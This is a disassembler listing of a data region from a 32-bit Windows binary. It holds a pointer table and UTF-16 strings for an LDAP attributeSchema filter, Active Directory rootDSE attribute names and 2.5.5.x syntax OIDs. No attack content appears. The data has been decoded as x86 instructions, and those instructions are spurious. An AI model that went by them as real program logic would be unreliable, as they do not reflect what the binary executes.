  40303f:	00 88 08 43 00 82    	add    %cl,-0x7dffbcf8(%eax)
  403045:	08 43 00             	or     %al,0x0(%ebx)
  403048:	7c 08                	jl     0x403052
  40304a:	43                   	inc    %ebx
  40304b:	00 00                	add    %al,(%eax)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	00 5c 81 40          	add    %bl,0x40(%ecx,%eax,4)
  403053:	00 70 08             	add    %dh,0x8(%eax)
  403056:	43                   	inc    %ebx
  403057:	00 21                	add    %ah,(%ecx)
  403059:	11 41 00             	adc    %eax,0x0(%ecx)
  40305c:	94                   	xchg   %eax,%esp
  40305d:	60                   	pusha
  40305e:	41                   	inc    %ecx
  40305f:	00 30                	add    %dh,(%eax)
  403061:	44                   	inc    %esp
  403062:	41                   	inc    %ecx
  403063:	00 94 60 41 00 36 06 	add    %dl,0x6360041(%eax,%eiz,2)
  40306a:	43                   	inc    %ebx
  40306b:	00 30                	add    %dh,(%eax)
  40306d:	06                   	push   %es
  40306e:	43                   	inc    %ebx
  40306f:	00 2a                	add    %ch,(%edx)
  403071:	06                   	push   %es
  403072:	43                   	inc    %ebx
  403073:	00 24 06             	add    %ah,(%esi,%eax,1)
  403076:	43                   	inc    %ebx
  403077:	00 1e                	add    %bl,(%esi)
  403079:	06                   	push   %es
  40307a:	43                   	inc    %ebx
  40307b:	00 18                	add    %bl,(%eax)
  40307d:	06                   	push   %es
  40307e:	43                   	inc    %ebx
  40307f:	00 12                	add    %dl,(%edx)
  403081:	06                   	push   %es
  403082:	43                   	inc    %ebx
  403083:	00 89 0e 41 00 0c    	add    %cl,0xc00410e(%ecx)
  403089:	06                   	push   %es
  40308a:	43                   	inc    %ebx
  40308b:	00 06                	add    %al,(%esi)
  40308d:	06                   	push   %es
  40308e:	43                   	inc    %ebx
  40308f:	00 00                	add    %al,(%eax)
  403091:	06                   	push   %es
  403092:	43                   	inc    %ebx
  403093:	00 fa                	add    %bh,%dl
  403095:	05 43 00 f4 05       	add    $0x5f40043,%eax
  40309a:	43                   	inc    %ebx
  40309b:	00 ee                	add    %ch,%dh
  40309d:	05 43 00 e8 05       	add    $0x5e80043,%eax
  4030a2:	43                   	inc    %ebx
  4030a3:	00 e2                	add    %ah,%dl
  4030a5:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  4030aa:	43                   	inc    %ebx
  4030ab:	00 d6                	add    %dl,%dh
  4030ad:	05 43 00 d0 05       	add    $0x5d00043,%eax
  4030b2:	43                   	inc    %ebx
  4030b3:	00 ca                	add    %cl,%dl
  4030b5:	05 43 00 c4 05       	add    $0x5c40043,%eax
  4030ba:	43                   	inc    %ebx
  4030bb:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  4030c1:	05 43 00 b2 05       	add    $0x5b20043,%eax
  4030c6:	43                   	inc    %ebx
  4030c7:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  4030ce:	43                   	inc    %ebx
  4030cf:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  4030d5:	05 43 00 94 05       	add    $0x5940043,%eax
  4030da:	43                   	inc    %ebx
  4030db:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  4030e1:	60                   	pusha
  4030e2:	41                   	inc    %ecx
  4030e3:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  4030e9:	a9 40 00 88 05       	test   $0x5880040,%eax
  4030ee:	43                   	inc    %ebx
  4030ef:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  4030f5:	05 43 00 76 05       	add    $0x5760043,%eax
  4030fa:	43                   	inc    %ebx
  4030fb:	00 70 05             	add    %dh,0x5(%eax)
  4030fe:	43                   	inc    %ebx
  4030ff:	00 6a 05             	add    %ch,0x5(%edx)
  403102:	43                   	inc    %ebx
  403103:	00 6a 08             	add    %ch,0x8(%edx)
  403106:	43                   	inc    %ebx
  403107:	00 5e 05             	add    %bl,0x5(%esi)
  40310a:	43                   	inc    %ebx
  40310b:	00 58 05             	add    %bl,0x5(%eax)
  40310e:	43                   	inc    %ebx
  40310f:	00 52 05             	add    %dl,0x5(%edx)
  403112:	43                   	inc    %ebx
  403113:	00 64 08 43          	add    %ah,0x43(%eax,%ecx,1)
  403117:	00 b0 81 40 00 70    	add    %dh,0x70004081(%eax)
  40311d:	08 43 00             	or     %al,0x0(%ebx)
  403120:	21 11                	and    %edx,(%ecx)
  403122:	41                   	inc    %ecx
  403123:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  40312a:	41                   	inc    %ecx
  40312b:	00 94 60 41 00 36 06 	add    %dl,0x6360041(%eax,%eiz,2)
  403132:	43                   	inc    %ebx
  403133:	00 30                	add    %dh,(%eax)
  403135:	06                   	push   %es
  403136:	43                   	inc    %ebx
  403137:	00 2a                	add    %ch,(%edx)
  403139:	06                   	push   %es
  40313a:	43                   	inc    %ebx
  40313b:	00 24 06             	add    %ah,(%esi,%eax,1)
  40313e:	43                   	inc    %ebx
  40313f:	00 1e                	add    %bl,(%esi)
  403141:	06                   	push   %es
  403142:	43                   	inc    %ebx
  403143:	00 18                	add    %bl,(%eax)
  403145:	06                   	push   %es
  403146:	43                   	inc    %ebx
  403147:	00 12                	add    %dl,(%edx)
  403149:	06                   	push   %es
  40314a:	43                   	inc    %ebx
  40314b:	00 8f 0e 41 00 0c    	add    %cl,0xc00410e(%edi)
  403151:	06                   	push   %es
  403152:	43                   	inc    %ebx
  403153:	00 06                	add    %al,(%esi)
  403155:	06                   	push   %es
  403156:	43                   	inc    %ebx
  403157:	00 00                	add    %al,(%eax)
  403159:	06                   	push   %es
  40315a:	43                   	inc    %ebx
  40315b:	00 fa                	add    %bh,%dl
  40315d:	05 43 00 f4 05       	add    $0x5f40043,%eax
  403162:	43                   	inc    %ebx
  403163:	00 ee                	add    %ch,%dh
  403165:	05 43 00 e8 05       	add    $0x5e80043,%eax
  40316a:	43                   	inc    %ebx
  40316b:	00 e2                	add    %ah,%dl
  40316d:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  403172:	43                   	inc    %ebx
  403173:	00 d6                	add    %dl,%dh
  403175:	05 43 00 d0 05       	add    $0x5d00043,%eax
  40317a:	43                   	inc    %ebx
  40317b:	00 ca                	add    %cl,%dl
  40317d:	05 43 00 c4 05       	add    $0x5c40043,%eax
  403182:	43                   	inc    %ebx
  403183:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  403189:	05 43 00 b2 05       	add    $0x5b20043,%eax
  40318e:	43                   	inc    %ebx
  40318f:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  403196:	43                   	inc    %ebx
  403197:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  40319d:	05 43 00 94 05       	add    $0x5940043,%eax
  4031a2:	43                   	inc    %ebx
  4031a3:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  4031a9:	60                   	pusha
  4031aa:	41                   	inc    %ecx
  4031ab:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  4031b1:	a9 40 00 88 05       	test   $0x5880040,%eax
  4031b6:	43                   	inc    %ebx
  4031b7:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  4031bd:	05 43 00 76 05       	add    $0x5760043,%eax
  4031c2:	43                   	inc    %ebx
  4031c3:	00 70 05             	add    %dh,0x5(%eax)
  4031c6:	43                   	inc    %ebx
  4031c7:	00 6a 05             	add    %ch,0x5(%edx)
  4031ca:	43                   	inc    %ebx
  4031cb:	00 6a 08             	add    %ch,0x8(%edx)
  4031ce:	43                   	inc    %ebx
  4031cf:	00 5e 05             	add    %bl,0x5(%esi)
  4031d2:	43                   	inc    %ebx
  4031d3:	00 58 05             	add    %bl,0x5(%eax)
  4031d6:	43                   	inc    %ebx
  4031d7:	00 52 05             	add    %dl,0x5(%edx)
  4031da:	43                   	inc    %ebx
  4031db:	00 64 08 43          	add    %ah,0x43(%eax,%ecx,1)
  4031df:	00 28                	add    %ch,(%eax)
  4031e1:	00 26                	add    %ah,(%esi)
  4031e3:	00 28                	add    %ch,(%eax)
  4031e5:	00 6f 00             	add    %ch,0x0(%edi)
  4031e8:	62 00                	bound  %eax,(%eax)
  4031ea:	6a 00                	push   $0x0
  4031ec:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4031f0:	74 00                	je     0x4031f2
  4031f2:	43                   	inc    %ebx
  4031f3:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  4031f7:	00 73 00             	add    %dh,0x0(%ebx)
  4031fa:	73 00                	jae    0x4031fc
  4031fc:	3d 00 61 00 74       	cmp    $0x74006100,%eax
  403201:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  403205:	00 69 00             	add    %ch,0x0(%ecx)
  403208:	62 00                	bound  %eax,(%eax)
  40320a:	75 00                	jne    0x40320c
  40320c:	74 00                	je     0x40320e
  40320e:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  403212:	63 00                	arpl   %eax,(%eax)
  403214:	68 00 65 00 6d       	push   $0x6d006500
  403219:	00 61 00             	add    %ah,0x0(%ecx)
  40321c:	29 00                	sub    %eax,(%eax)
  40321e:	28 00                	sub    %al,(%eax)
  403220:	6c                   	insb   (%dx),%es:(%edi)
  403221:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  403225:	00 50 00             	add    %dl,0x0(%eax)
  403228:	44                   	inc    %esp
  403229:	00 69 00             	add    %ch,0x0(%ecx)
  40322c:	73 00                	jae    0x40322e
  40322e:	70 00                	jo     0x403230
  403230:	6c                   	insb   (%dx),%es:(%edi)
  403231:	00 61 00             	add    %ah,0x0(%ecx)
  403234:	79 00                	jns    0x403236
  403236:	4e                   	dec    %esi
  403237:	00 61 00             	add    %ah,0x0(%ecx)
  40323a:	6d                   	insl   (%dx),%es:(%edi)
  40323b:	00 65 00             	add    %ah,0x0(%ebp)
  40323e:	3d 00 25 00 73       	cmp    $0x73002500,%eax
  403243:	00 29                	add    %ch,(%ecx)
  403245:	00 29                	add    %ch,(%ecx)
  403247:	00 00                	add    %al,(%eax)
  403249:	00 00                	add    %al,(%eax)
  40324b:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40324f:	00 41 00             	add    %al,0x0(%ecx)
  403252:	50                   	push   %eax
  403253:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  403257:	00 73 00             	add    %dh,0x0(%ebx)
  40325a:	70 00                	jo     0x40325c
  40325c:	6c                   	insb   (%dx),%es:(%edi)
  40325d:	00 61 00             	add    %ah,0x0(%ecx)
  403260:	79 00                	jns    0x403262
  403262:	4e                   	dec    %esi
  403263:	00 61 00             	add    %ah,0x0(%ecx)
  403266:	6d                   	insl   (%dx),%es:(%edi)
  403267:	00 65 00             	add    %ah,0x0(%ebp)
  40326a:	00 00                	add    %al,(%eax)
  40326c:	3a 00                	cmp    (%eax),%al
  40326e:	00 00                	add    %al,(%eax)
  403270:	55                   	push   %ebp
  403271:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  403275:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  403279:	00 6d 00             	add    %ch,0x0(%ebp)
  40327c:	65 00 00             	add    %al,%gs:(%eax)
  40327f:	00 3b                	add    %bh,(%ebx)
  403281:	00 72 00             	add    %dh,0x0(%edx)
  403284:	61                   	popa
  403285:	00 6e 00             	add    %ch,0x0(%esi)
  403288:	67 00 65 00          	add    %ah,0x0(%di)
  40328c:	3d 00 30 00 2d       	cmp    $0x2d003000,%eax
  403291:	00 2a                	add    %ch,(%edx)
  403293:	00 00                	add    %al,(%eax)
  403295:	00 00                	add    %al,(%eax)
  403297:	00 11                	add    %dl,(%ecx)
  403299:	01 00                	add    %eax,(%eax)
  40329b:	00 01                	add    %al,(%ecx)
  40329d:	00 00                	add    %al,(%eax)
  40329f:	00 0e                	add    %cl,(%esi)
  4032a1:	04 00                	add    $0x0,%al
  4032a3:	00 0e                	add    %cl,(%esi)
  4032a5:	04 00                	add    $0x0,%al
  4032a7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4032aa:	00 00                	add    %al,(%eax)
  4032ac:	f8                   	clc
  4032ad:	34 41                	xor    $0x41,%al
  4032af:	00 11                	add    %dl,(%ecx)
  4032b1:	01 00                	add    %eax,(%eax)
  4032b3:	00 01                	add    %al,(%ecx)
  4032b5:	00 00                	add    %al,(%eax)
  4032b7:	00 0d 04 00 00 0d    	add    %cl,0xd000004
  4032bd:	04 00                	add    $0x0,%al
  4032bf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4032c2:	00 00                	add    %al,(%eax)
  4032c4:	0a 3e                	or     (%esi),%bh
  4032c6:	41                   	inc    %ecx
	...
  4032df:	00 f1                	add    %dh,%cl
  4032e1:	d6                   	salc
  4032e2:	42                   	inc    %edx
  4032e3:	00 98 32 40 00 69    	add    %bl,0x69004032(%eax)
  4032e9:	00 73 00             	add    %dh,0x0(%ebx)
  4032ec:	53                   	push   %ebx
  4032ed:	00 79 00             	add    %bh,0x0(%ecx)
  4032f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4032f1:	00 63 00             	add    %ah,0x0(%ebx)
  4032f4:	68 00 72 00 6f       	push   $0x6f007200
  4032f9:	00 6e 00             	add    %ch,0x0(%esi)
  4032fc:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  403302:	64 00 00             	add    %al,%fs:(%eax)
  403305:	00 00                	add    %al,(%eax)
  403307:	00 32                	add    %dh,(%edx)
  403309:	00 2e                	add    %ch,(%esi)
  40330b:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  403311:	00 2e                	add    %ch,(%esi)
  403313:	00 38                	add    %bh,(%eax)
  403315:	00 00                	add    %al,(%eax)
  403317:	00 69 00             	add    %ch,0x0(%ecx)
  40331a:	73 00                	jae    0x40331c
  40331c:	47                   	inc    %edi
  40331d:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  403321:	00 62 00             	add    %ah,0x0(%edx)
  403324:	61                   	popa
  403325:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  403329:	00 61 00             	add    %ah,0x0(%ecx)
  40332c:	74 00                	je     0x40332e
  40332e:	61                   	popa
  40332f:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  403333:	00 67 00             	add    %ah,0x0(%edi)
  403336:	52                   	push   %edx
  403337:	00 65 00             	add    %ah,0x0(%ebp)
  40333a:	61                   	popa
  40333b:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 00                	add    %al,(%eax)
  403343:	00 66 00             	add    %ah,0x0(%esi)
  403346:	6f                   	outsl  %ds:(%esi),(%dx)
  403347:	00 72 00             	add    %dh,0x0(%edx)
  40334a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40334e:	74 00                	je     0x403350
  403350:	46                   	inc    %esi
  403351:	00 75 00             	add    %dh,0x0(%ebp)
  403354:	6e                   	outsb  %ds:(%esi),(%dx)
  403355:	00 63 00             	add    %ah,0x0(%ebx)
  403358:	74 00                	je     0x40335a
  40335a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  403360:	61                   	popa
  403361:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  403365:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  403369:	00 00                	add    %al,(%eax)
  40336b:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40336f:	00 6d 00             	add    %ch,0x0(%ebp)
  403372:	61                   	popa
  403373:	00 69 00             	add    %ch,0x0(%ecx)
  403376:	6e                   	outsb  %ds:(%esi),(%dx)
  403377:	00 46 00             	add    %al,0x0(%esi)
  40337a:	75 00                	jne    0x40337c
  40337c:	6e                   	outsb  %ds:(%esi),(%dx)
  40337d:	00 63 00             	add    %ah,0x0(%ebx)
  403380:	74 00                	je     0x403382
  403382:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  403388:	61                   	popa
  403389:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40338d:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  403391:	00 00                	add    %al,(%eax)
  403393:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  403397:	00 6d 00             	add    %ch,0x0(%ebp)
  40339a:	61                   	popa
  40339b:	00 69 00             	add    %ch,0x0(%ecx)
  40339e:	6e                   	outsb  %ds:(%esi),(%dx)
  40339f:	00 43 00             	add    %al,0x0(%ebx)
  4033a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4033a3:	00 6e 00             	add    %ch,0x0(%esi)
  4033a6:	74 00                	je     0x4033a8
  4033a8:	72 00                	jb     0x4033aa
  4033aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ab:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4033af:	00 65 00             	add    %ah,0x0(%ebp)
  4033b2:	72 00                	jb     0x4033b4
  4033b4:	46                   	inc    %esi
  4033b5:	00 75 00             	add    %dh,0x0(%ebp)
  4033b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4033b9:	00 63 00             	add    %ah,0x0(%ebx)
  4033bc:	74 00                	je     0x4033be
  4033be:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4033c4:	61                   	popa
  4033c5:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4033c9:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  4033cd:	00 00                	add    %al,(%eax)
  4033cf:	00 68 00             	add    %ch,0x0(%eax)
  4033d2:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  4033d8:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4033dc:	74 00                	je     0x4033de
  4033de:	43                   	inc    %ebx
  4033df:	00 6f 00             	add    %ch,0x0(%edi)
  4033e2:	6d                   	insl   (%dx),%es:(%edi)
  4033e3:	00 6d 00             	add    %ch,0x0(%ebp)
  4033e6:	69 00 74 00 74 00    	imul   $0x740074,(%eax),%eax
  4033ec:	65 00 64 00 55       	add    %ah,%gs:0x55(%eax,%eax,1)
  4033f1:	00 73 00             	add    %dh,0x0(%ebx)
  4033f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  4033fb:	00 61 00             	add    %ah,0x0(%ecx)
  4033fe:	70 00                	jo     0x403400
  403400:	53                   	push   %ebx
  403401:	00 65 00             	add    %ah,0x0(%ebp)
  403404:	72 00                	jb     0x403406
  403406:	76 00                	jbe    0x403408
  403408:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40340e:	4e                   	dec    %esi
  40340f:	00 61 00             	add    %ah,0x0(%ecx)
  403412:	6d                   	insl   (%dx),%es:(%edi)
  403413:	00 65 00             	add    %ah,0x0(%ebp)
  403416:	00 00                	add    %al,(%eax)
  403418:	73 00                	jae    0x40341a
  40341a:	75 00                	jne    0x40341c
  40341c:	70 00                	jo     0x40341e
  40341e:	70 00                	jo     0x403420
  403420:	6f                   	outsl  %ds:(%esi),(%dx)
  403421:	00 72 00             	add    %dh,0x0(%edx)
  403424:	74 00                	je     0x403426
  403426:	65 00 64 00 43       	add    %ah,%gs:0x43(%eax,%eax,1)
  40342b:	00 61 00             	add    %ah,0x0(%ecx)
  40342e:	70 00                	jo     0x403430
  403430:	61                   	popa
  403431:	00 62 00             	add    %ah,0x0(%edx)
  403434:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
  40343a:	74 00                	je     0x40343c
  40343c:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  403442:	00 00                	add    %al,(%eax)
  403444:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  403448:	73 00                	jae    0x40344a
  40344a:	48                   	dec    %eax
  40344b:	00 6f 00             	add    %ch,0x0(%edi)
  40344e:	73 00                	jae    0x403450
  403450:	74 00                	je     0x403452
  403452:	4e                   	dec    %esi
  403453:	00 61 00             	add    %ah,0x0(%ecx)
  403456:	6d                   	insl   (%dx),%es:(%edi)
  403457:	00 65 00             	add    %ah,0x0(%ebp)
  40345a:	00 00                	add    %al,(%eax)
  40345c:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  403460:	53                   	push   %ebx
  403461:	00 65 00             	add    %ah,0x0(%ebp)
  403464:	72 00                	jb     0x403466
  403466:	76 00                	jbe    0x403468
  403468:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40346e:	4e                   	dec    %esi
  40346f:	00 61 00             	add    %ah,0x0(%ecx)
  403472:	6d                   	insl   (%dx),%es:(%edi)
  403473:	00 65 00             	add    %ah,0x0(%ebp)
  403476:	00 00                	add    %al,(%eax)
  403478:	73 00                	jae    0x40347a
  40347a:	75 00                	jne    0x40347c
  40347c:	70 00                	jo     0x40347e
  40347e:	70 00                	jo     0x403480
  403480:	6f                   	outsl  %ds:(%esi),(%dx)
  403481:	00 72 00             	add    %dh,0x0(%edx)
  403484:	74 00                	je     0x403486
  403486:	65 00 64 00 53       	add    %ah,%gs:0x53(%eax,%eax,1)
  40348b:	00 41 00             	add    %al,0x0(%ecx)
  40348e:	53                   	push   %ebx
  40348f:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  403493:	00 65 00             	add    %ah,0x0(%ebp)
  403496:	63 00                	arpl   %eax,(%eax)
  403498:	68 00 61 00 6e       	push   $0x6e006100
  40349d:	00 69 00             	add    %ch,0x0(%ecx)
  4034a0:	73 00                	jae    0x4034a2
  4034a2:	6d                   	insl   (%dx),%es:(%edi)
  4034a3:	00 73 00             	add    %dh,0x0(%ebx)
  4034a6:	00 00                	add    %al,(%eax)
  4034a8:	32 00                	xor    (%eax),%al
  4034aa:	2e 00 35 00 2e 00 35 	add    %dh,%cs:0x35002e00
  4034b1:	00 2e                	add    %ch,(%esi)
  4034b3:	00 34 00             	add    %dh,(%eax,%eax,1)
  4034b6:	00 00                	add    %al,(%eax)
  4034b8:	73 00                	jae    0x4034ba
  4034ba:	75 00                	jne    0x4034bc
  4034bc:	70 00                	jo     0x4034be
  4034be:	70 00                	jo     0x4034c0
  4034c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c1:	00 72 00             	add    %dh,0x0(%edx)
  4034c4:	74 00                	je     0x4034c6
  4034c6:	65 00 64 00 4c       	add    %ah,%gs:0x4c(%eax,%eax,1)
  4034cb:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  4034cf:	00 50 00             	add    %dl,0x0(%eax)
  4034d2:	50                   	push   %eax
  4034d3:	00 6f 00             	add    %ch,0x0(%edi)
  4034d6:	6c                   	insb   (%dx),%es:(%edi)
  4034d7:	00 69 00             	add    %ch,0x0(%ecx)
  4034da:	63 00                	arpl   %eax,(%eax)
  4034dc:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4034e2:	00 00                	add    %al,(%eax)
  4034e4:	32 00                	xor    (%eax),%al
  4034e6:	2e 00 35 00 2e 00 35 	add    %dh,%cs:0x35002e00
  4034ed:	00 2e                	add    %ch,(%esi)
  4034ef:	00 39                	add    %bh,(%ecx)
  4034f1:	00 00                	add    %al,(%eax)
  4034f3:	00 73 00             	add    %dh,0x0(%ebx)
  4034f6:	75 00                	jne    0x4034f8
  4034f8:	70 00                	jo     0x4034fa
  4034fa:	70 00                	jo     0x4034fc
  4034fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4034fd:	00 72 00             	add    %dh,0x0(%edx)
  403500:	74 00                	je     0x403502
  403502:	65 00 64 00 4c       	add    %ah,%gs:0x4c(%eax,%eax,1)
  403507:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  40350b:	00 50 00             	add    %dl,0x0(%eax)
  40350e:	56                   	push   %esi
  40350f:	00 65 00             	add    %ah,0x0(%ebp)
  403512:	72 00                	jb     0x403514
  403514:	73 00                	jae    0x403516
  403516:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40351c:	00 00                	add    %al,(%eax)
  40351e:	00 00                	add    %al,(%eax)
  403520:	32 00                	xor    (%eax),%al
  403522:	2e 00 35 00 2e 00 35 	add    %dh,%cs:0x35002e00
  403529:	00 2e                	add    %ch,(%esi)
  40352b:	00 32                	add    %dh,(%edx)
  40352d:	00 00                	add    %al,(%eax)
  40352f:	00 73 00             	add    %dh,0x0(%ebx)
  403532:	75 00                	jne    0x403534
  403534:	70 00                	jo     0x403536
  403536:	70 00                	jo     0x403538
  403538:	6f                   	outsl  %ds:(%esi),(%dx)
  403539:	00 72 00             	add    %dh,0x0(%edx)
  40353c:	74 00                	je     0x40353e
  40353e:	65 00 64 00 43       	add    %ah,%gs:0x43(%eax,%eax,1)
  403543:	00 6f 00             	add    %ch,0x0(%edi)
  403546:	6e                   	outsb  %ds:(%esi),(%dx)
  403547:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40354b:	00 6f 00             	add    %ch,0x0(%edi)
  40354e:	6c                   	insb   (%dx),%es:(%edi)
  40354f:	00 00                	add    %al,(%eax)
  403551:	00 00                	add    %al,(%eax)
  403553:	00 72 00             	add    %dh,0x0(%edx)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	00 6f 00             	add    %ch,0x0(%edi)
  40355a:	74 00                	je     0x40355c
  40355c:	44                   	inc    %esp
  40355d:	00 6f 00             	add    %ch,0x0(%edi)
  403560:	6d                   	insl   (%dx),%es:(%edi)
  403561:	00 61 00             	add    %ah,0x0(%ecx)
  403564:	69 00 6e 00 4e 00    	imul   $0x4e006e,(%eax),%eax
  40356a:	61                   	popa
  40356b:	00 6d 00             	add    %ch,0x0(%ebp)
  40356e:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  403574:	43                   	inc    %ebx
  403575:	00 6f 00             	add    %ch,0x0(%edi)
  403578:	6e                   	outsb  %ds:(%esi),(%dx)
  403579:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40357d:	00 78 00             	add    %bh,0x0(%eax)
  403580:	74 00                	je     0x403582
  403582:	00 00                	add    %al,(%eax)
  403584:	63 00                	arpl   %eax,(%eax)
  403586:	6f                   	outsl  %ds:(%esi),(%dx)
  403587:	00 6e 00             	add    %ch,0x0(%esi)
  40358a:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40358e:	67 00 75 00          	add    %dh,0x0(%di)
  403592:	72 00                	jb     0x403594
  403594:	61                   	popa
  403595:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  403599:	00 6f 00             	add    %ch,0x0(%edi)
  40359c:	6e                   	outsb  %ds:(%esi),(%dx)
  40359d:	00 4e 00             	add    %cl,0x0(%esi)
  4035a0:	61                   	popa
  4035a1:	00 6d 00             	add    %ch,0x0(%ebp)
  4035a4:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4035aa:	43                   	inc    %ebx
  4035ab:	00 6f 00             	add    %ch,0x0(%edi)
  4035ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4035af:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4035b3:	00 78 00             	add    %bh,0x0(%eax)
  4035b6:	74 00                	je     0x4035b8
  4035b8:	00 00                	add    %al,(%eax)
  4035ba:	00 00                	add    %al,(%eax)
  4035bc:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4035c0:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4035c4:	75 00                	jne    0x4035c6
  4035c6:	6c                   	insb   (%dx),%es:(%edi)
  4035c7:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  4035cb:	00 61 00             	add    %ah,0x0(%ecx)
  4035ce:	6d                   	insl   (%dx),%es:(%edi)
  4035cf:	00 69 00             	add    %ch,0x0(%ecx)
  4035d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4035d3:	00 67 00             	add    %ah,0x0(%edi)
  4035d6:	43                   	inc    %ebx
  4035d7:	00 6f 00             	add    %ch,0x0(%edi)
  4035da:	6e                   	outsb  %ds:(%esi),(%dx)
  4035db:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4035df:	00 78 00             	add    %bh,0x0(%eax)
  4035e2:	74 00                	je     0x4035e4
  4035e4:	00 00                	add    %al,(%eax)
  4035e6:	00 00                	add    %al,(%eax)
  4035e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4035e9:	00 61 00             	add    %ah,0x0(%ecx)
  4035ec:	6d                   	insl   (%dx),%es:(%edi)
  4035ed:	00 69 00             	add    %ch,0x0(%ecx)
  4035f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4035f1:	00 67 00             	add    %ah,0x0(%edi)
  4035f4:	43                   	inc    %ebx
  4035f5:	00 6f 00             	add    %ch,0x0(%edi)
  4035f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4035f9:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4035fd:	00 78 00             	add    %bh,0x0(%eax)
  403600:	74 00                	je     0x403602
  403602:	73 00                	jae    0x403604
  403604:	00 00                	add    %al,(%eax)
  403606:	00 00                	add    %al,(%eax)
  403608:	73 00                	jae    0x40360a
  40360a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40360e:	76 00                	jbe    0x403610
  403610:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403614:	4e                   	dec    %esi
  403615:	00 61 00             	add    %ah,0x0(%ecx)
  403618:	6d                   	insl   (%dx),%es:(%edi)
  403619:	00 65 00             	add    %ah,0x0(%ebp)
  40361c:	00 00                	add    %al,(%eax)
